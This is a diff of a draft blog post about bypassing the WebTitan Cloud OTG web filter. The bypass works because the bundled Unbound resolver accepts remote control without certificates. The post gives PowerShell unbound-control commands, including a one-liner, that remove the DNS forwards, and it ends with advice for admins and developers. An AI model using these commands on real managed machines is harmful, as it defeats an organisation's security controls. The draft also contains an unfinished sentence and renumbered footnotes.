@@ -7,17 +7,17 @@ draft = true
 
 Hi, this is edited from an old [Gist](https://gist.github.com/meskuk/f3ebb741e4d3591e79f004a4a62d73c5) of mine.
 
-When I had reported this to WebTitan at the time, it turned out to be already fixed. Still, I would like my achievement to be visible. Please enjoy.
+When I had reported this to WebTitan at the time, it turned out to be *already fixed*. Still, I would like my achievement to be visible! Please enjoy.
 
 ---
 
 Web filtering is very common in organisations. Maybe a library doesn't want you looking for Linux ISOs online,
 or your workplace definitely doesn't need you using Instagram on the job.
 
-Filtering can be done in a few ways: transparently by the network's firewall, or on the endpoint[^1]
+There are two main ways to achieve web filtering that I've seen: transparently by the network's firewall, or on the endpoint with an agent,
+browser plugin or otherwise[^1].
 
-WebTitan Cloud OTG, or On The Go, is the agent we'll be working with today. There's nothing _wrong_ with agents on the
-endpoint, but they need to be paired with good policies - or you'll end up with this blog post.
+Today we'll be covering WebTitan Cloud OTG (On The Go), a roaming agent we'll be working with today.
 
 # Bypass 1
 
@@ -45,10 +45,10 @@ Mode                 LastWriteTime         Length Name
 -a----        09/12/2022     11:40        7978054 unbound.exe
 ```
 
-So if my guess is right, I don't need to hunt down the DNS server on this computer. (But if I knew nothing, I'd probably try that first).
+[unbound](). So it's very likely just using this
 
 ## The config
-Let's look at the configuration, which is presumably `service.conf`. Some important snippets:
+Let's look at the configuration in `service.conf`, which we are thankfully able to access. Some important snippets:
 
 ```yaml
 forward-zone:
@@ -64,8 +64,8 @@ forward-zone:
     forward-no-cache: yes
 ```
 
-This part forwards queries for the root zone (`.`) and the reverse DNS zone (`in-addr.arpa`) to the respective servers.
-Basically, WebTitan's filter gets all your DNS queries.
+This part forwards queries for the root zone (`.`) and the reverse DNS zone (`in-addr.arpa`) to WebTitan's servers.
+Basically, this is the sole reason they can filter our DNS lookups in the first place.
 
 ```yaml
 # Remote control config section.
@@ -79,24 +79,19 @@ remote-control:
 	control-use-cert: no
 ```
 
-This enables 
-turns off certificate verification, meaning you don't need to prove your identity to the service at all.
+**This** part is really important. Unbound allows remote control by connecting to port 8953, which is enabled here.
 
-But first, I will try a simple solution: kill unbound.
+But if you enable remote control over the network (or from localhost), you should be using certificates and enabling
+`control-use-cert`. This way, only users with the client certificate can access it.[^2]
 
-```
-> (Get-Process -Name *unbound*).Kill()
-Exception calling "Kill" with "0" argument(s): "Access is denied"
-[ insert more here ]
-```
+Since `control-use-cert` is set to `no`, you don't need to prove your identity to Unbound at all to control the daemon.
+How convenient!
 
-It doesn't work. Moving on.
+## Bypass using unbound-control
 
-## Using remote control
+We can test out `unbound-control` by listing the forwards in place.
 
-Time to check that remote control is working, by checking the forward zones.
-
-```
+```powershell
 PS C:\Program Files (x86)\WebTitan Cloud OTG\Unbound> .\unbound-control.exe -c .\service.conf list_forwards
 . IN forward 52.209.170.167 52.209.115.90
 in-addr.arpa. IN forward 156.154.70.1 156.154.71.1
@@ -104,18 +99,32 @@ in-addr.arpa. IN forward 156.154.70.1 156.154.71.1
 
 Excellent! Time to remove one.
 
-```
+```powershell
 PS C:\Program Files (x86)\WebTitan Cloud OTG\Unbound> .\unbound-control.exe -c .\service.conf forward_remove .
 ok
 PS C:\Program Files (x86)\WebTitan Cloud OTG\Unbound> .\unbound-control.exe -c .\service.conf list_forwards
 in-addr.arpa. IN forward 156.154.70.1 156.154.71.1
 ```
 
-It works! No more filtering. In a nutshell:
+And we are done. No more filtering. As a one-liner:
 
 ```powershell
 cd "C:\Program Files (x86)\WebTitan Cloud OTG\Unbound"; .\unbound-control.exe -c .\service.conf forward off
 ```
+# Key takeaways
+
+This was arguably quite simple and fun to find, but what can we learn from this?
+
+Well, for admins:
+- Make sure the user can't browse application directories. The place where I found this made it impossible in File Explorer,
+but that brings me to my next point.
+- Make sure the user can't open a shell. I did all of this in Windows Terminal. Other methods include using File Explorer's URL bar,
+Cygwin, Python, and likely more!
+
+For developers:
+- Consider what unprivileged users can do when the admin's safeguards aren't there, or have a hole. Even if I could not modify
+application settings, an open port let me manipulate them!
 
 [^1]: Oho, what a word. I feel like a real sysadmin now.
-[^2]: I realise it's more methodical to confirm with `netstat` and `nslookup` that yes, this is the DNS server, but the block pages and tray icon made it really apparent.
+[^2]: Cool fact, this configuration flaw is covered in [RHSA-2024-1750](https://access.redhat.com/errata/RHSA-2024:1750), as a bad default.
+[^3]: I realise it's more methodical to confirm with `netstat` and `nslookup` that yes, this is the DNS server, but the block pages and tray icon made it very apparent.
